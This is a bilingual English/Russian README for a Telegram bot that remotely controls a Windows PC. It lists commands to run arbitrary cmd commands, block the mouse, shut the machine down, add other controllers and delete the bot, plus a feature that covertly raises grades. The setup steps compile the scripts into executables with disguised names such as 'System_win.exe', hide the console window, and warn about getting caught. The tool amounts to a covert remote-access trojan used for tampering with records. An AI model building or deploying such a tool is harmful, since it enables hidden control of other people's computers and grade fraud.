# PC-control-telegram
Bot Features:
Increases the score with some probability 
2 => 3
3 => 4
4 => 5

And there are also commands:

/good_grades - increase the rating, available once every 20 minutes, while random placement is disabled, so use carefully 

/sleep_bot - stops the bot for 20 minutes 

/mouse_stop time - does not allow using the mouse for time seconds. Simulates wild glitches. If you set a long time, then you can quickly get burned

/sleep_pc time - turn off the computer after a few seconds

/sleep_pc_no_inform - Immediately turns off the computer

/cmd - outputs one command to cmd. Print from a new line

/cmd_bat - outputs several commands to cmd. Print from a new line

/padawan_write - adding Padawans. We write a command and a person's id separated by a space. You can find out here


There is also the possibility of remote removal of the bot
/delete_bot - available only to the bot owner (you need to register the telegram account id when creating the file)

## **Attention!!!!**

## The author is not responsible for your actions.


Hello everyone, this bot was developed for remotely comic computer control on Windows. 

Libraries will be needed for the bot to work, I'll leave them at the end of the file



To configure the bot, you need Python 3 and a program to open files (for example, PyCharm)

Setting up the bot:

1. Get a token in BotFather Telegram and install it in the config file.
2. Set your telegram id to the main file, this is a numeric value. We write only numbers, 
3. Through \auto-py-to-exe\ we turn files into exe
Accordingly 


Install.py to install.exe
main.py to System_win.exe
gelete.py to Sis.exe

Disable the console interface for all files except install. For install, you can leave.



You can also translate the bot into another language)

## Возможности бота:

С некоторой вероятностью повышает оценку 2 => 3,  3 => 4, 4 => 5


А также есть команды:

/good_grades - повысить оценку, доступно раз в 20 минут, при этом отключается рандомная расстановка, так что пользуйтесь аккуратно 

/sleep_bot - останавливает бота на 20 минут 

/mouse_stop time - не дает пользоваться мышкой time секунд. Имитирует дикие глюки. Если поставить большое время, то можно быстро спалиться


/sleep_pc time - выключить комп через time секунд

/sleep_pc_no_inform - Сразу отключает компьютер

/cmd - выводит одну команду в cmd. Печатать с новой строки

/cmd_bat - выводит несколько команд в cmd. Печатать с новой строки

/padawan_write - добавление Падаванов. Пишем команду и через пробел id человека. Узнать можно вот



Также есть возможность удаленного удаления бота
/delete_bot - доступно только хозяину бота (нужно при создании файла прописать id аккаунта телеграмма)

## ****ВНИМАНИЕ!!!!****

## Автор не несет ответственность за ваши действия.

Всем привет, данный бот был разработан для удаленно шуточного управления компьютером на Windows. 

Для работы бота понадобятся библиотеки, оставлю в конце файла



Для настройки бота нужен Python 3 and программа для открытия файлов (например PyCharm)

Настройка бота:

1. Получить токен в BotFather телеграмм и установить его в файл config.
2. Установить свой id телеграмма в main файл, это числовое значение. Пишем только цифры, 
3. Через \auto-py-to-exe\ превращаем файлы в exe
Соответственно 


Install.py to install.exe
main.py to System_win.exe
gelete.py to Sis.exe

У всех файлов кроме install отключаем консольный интерфейс. Для install можно оставить. 
 


pip install pytest-shutil
pip install pyTelegramBotAPI
pip install PyAutoGUI
pip install keyboard
pip install threaded